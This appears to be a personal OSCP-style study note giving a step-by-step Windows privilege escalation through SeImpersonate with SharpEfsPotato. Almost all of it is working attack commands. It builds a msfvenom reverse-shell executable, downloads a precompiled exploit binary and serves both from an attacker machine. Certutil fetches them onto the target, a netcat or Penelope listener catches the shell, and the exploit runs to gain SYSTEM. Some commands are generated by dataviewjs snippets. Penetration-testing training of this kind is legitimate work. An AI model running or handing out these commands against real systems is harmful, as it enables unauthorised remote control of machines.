## **SharpEfsPotato

My methodology for SeImpersonate exploitation:**
Personally, I always use `SharpEfsPotato` and run a reverse shell executable (generated from `msfvenom`) through it.
As a result, you will have a stable shell with SYSTEM user context.

This tool has never failed once on my side and is very reliable. You can look at the steps below regarding how to use it:
1. Generate `shell.exe` with this command:
```msfvenom -p windows/x64/shell_reverse_tcp LPORT=<PORT> LHOST=<IP> -f exe -o shell.exe```
2. Download SharpEfsPotato from here: https://github.com/jakobfriedl/precompiled-binaries/raw/main/PrivilegeEscalation/Token/SharpEfsPotato.exe
- Transfer `shell.exe` and `SharpEfsPotato.exe` to your TARGET.
- Start listener on KALI: `rlwrap -r nc -nlvp <PORT>`
- Execute this on TARGET:
```./SharpEfsPotato.exe -p shell.exe```

```
cd ~/Desktop/Tools/Windows && python -m http.server 80
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil.exe -f -urlcache -split http://${KaliIP}/SharpEfsPotato.exe SharpEfsPotato.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
#### Generate MSFvenom payload
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `msfvenom -p windows/x64/shell_reverse_tcp LPORT=4444 LHOST=${KaliIP} -f exe -o shell.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
python -m http.server 80
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil.exe -f -urlcache -split http://${KaliIP}/shell.exe shell.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
#### Start Penelope Listener

```
cd ~/Desktop/Tools/ && python3 penelope.py -p 4444
```
#### Run
```
./SharpEfsPotato.exe -p shell.exe
```
